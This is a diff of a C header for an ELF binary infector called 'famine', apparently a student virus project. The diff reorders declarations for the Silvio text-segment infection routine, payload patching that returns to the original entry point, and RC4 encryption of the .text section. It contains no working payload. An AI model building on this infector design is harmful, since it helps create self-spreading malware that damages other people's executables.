@@ -60,7 +60,6 @@ enum e_error
     ERROR_LSEEK,
     ERROR_NOT_ELF,
     ERROR_NOT_ELF32,
-    ERROR_NOT_ELF64,
     ERROR_MMAP,
     ERROR_NOT_A_REGULAR_FILE,
     ERROR_STAT,
@@ -78,12 +77,8 @@ enum e_error
 };
 
 #define PAGE_SIZE 0x1000
-#define KEY_LEN 0x80
-
-#define OUTPUT_FILE_NAME "famine"
-#define PAYLOAD_NAME "payload"
-
 #define SECTION_TO_ENCRYPT_NAME ".text"
+#define KEY_LEN 0x80
 
 /* Custom types for 32bit compatibility. */
 #ifdef ARCH_32
@@ -100,7 +95,6 @@ typedef Elf32_Off t_elf_off;
 
 #else /* 64 bits */
 
-// If ARCH_32 not define, define it to 0.
 #define ARCH_64 1
 #define ARCH_32 0
 
@@ -123,12 +117,11 @@ typedef struct s_famine
     void *mmap_ptr;
     void *string_table_ptr;
     size_t binary_data_size;
+    bool elf_64;
+    bool elf_32;
 
     void *payload_data;
     size_t payload_size;
-    char *encryption_key;
-
-    void *cipher;
 
     t_elf_ehdr *ehdr;
     t_elf_phdr *phdr;
@@ -141,12 +134,14 @@ typedef struct s_famine
     t_elf_off text_p_end_offset;
     size_t text_p_size;
     t_elf_addr text_p_vaddr;
-    size_t text_section_size;
 
     t_elf_off encrypt_s_start_offset;
     t_elf_off encrypt_s_end_offset;
     size_t encrypt_s_size;
     t_elf_addr encrypt_s_addr;
+
+    void *cipher;
+    char *encryption_key;
 
     int ret2oep_offset;
 
@@ -161,10 +156,6 @@ typedef struct s_famine
 void check_elf_header(t_famine *famine);
 void set_string_table_ptr(t_famine *famine);
 
-void key_generator(t_famine *famine);
-void cipher_famine_file_data(t_famine *famine);
-char *rc4_cipher(t_famine *famine, char *data, int len);
-
 void choose_infection_method(t_famine *famine);
 void silvio_text_infection(t_famine *famine);
 
@@ -172,6 +163,10 @@ size_t find_keysection_offset_elf64(t_famine *famine);
 size_t find_ret2oep_offset_elf64(t_famine *famine);
 size_t find_getencryptedsectionaddr_offset_elf64(t_famine *famine);
 size_t find_getencryptedsectionsize_offset_elf64(t_famine *famine);
+
+void key_generator(t_famine *famine);
+void cipher_famine_file_data(t_famine *famine);
+char *rc4_cipher(t_famine *famine, char *data, int len);
 
 void overwrite_payload_ret2oep(t_famine *famine);
 void overwrite_payload_getencryptedsectionaddr(t_famine *famine);
